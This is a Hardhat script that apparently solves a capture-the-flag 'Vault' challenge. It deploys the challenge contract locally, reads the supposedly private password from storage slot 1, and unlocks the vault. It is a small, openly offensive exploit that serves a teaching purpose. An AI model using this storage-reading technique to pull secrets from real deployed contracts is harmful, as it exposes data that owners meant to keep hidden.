const { ethers } = require('hardhat');

async function main() {
    const [owner, player] = await ethers.getSigners();

    console.log("\n[0] original owner: ", owner.address);
    console.log("[0] player: ", player.address);

    console.log("\n[1] deploy VaultFactory");
    const Factory = await ethers.getContractFactory("VaultFactory");
    const factory = await Factory.connect(owner).deploy();
    await factory.deployed();
    console.log("---- VaultFactory address: ", factory.address);

    console.log("\n[2] create a Vault instance");
    const receipt = await factory.connect(player).createInstance(player.address);
    const instance_address = (await receipt.wait()).events[0].args[0];
    const vault = await ethers.getContractAt("Vault", instance_address, owner);
    console.log("---- Vault address: ", vault.address);

    console.log("\n[3] get password");
    const password = await ethers.provider.getStorageAt(vault.address, 1);
    console.log("---- private password(hex):", password.slice(0, 48), "...");
    console.log("---- private password(str):", hex2a(password));

    console.log("\n[4] unlock");
    await vault.unlock(password);

    console.log("\n[6] validate solved");
    const res = await factory.validateInstance(vault.address, player.address);

    if (res == true) {
        console.log("[+] Done!");
    } else {
        console.log("[+] Fail...");
    }
}

function hex2a(hexx) {
    var hex = hexx.toString();//force conversion
    var str = '';
    for (var i = 0; i < hex.length; i += 2)
        str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    return str;
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});

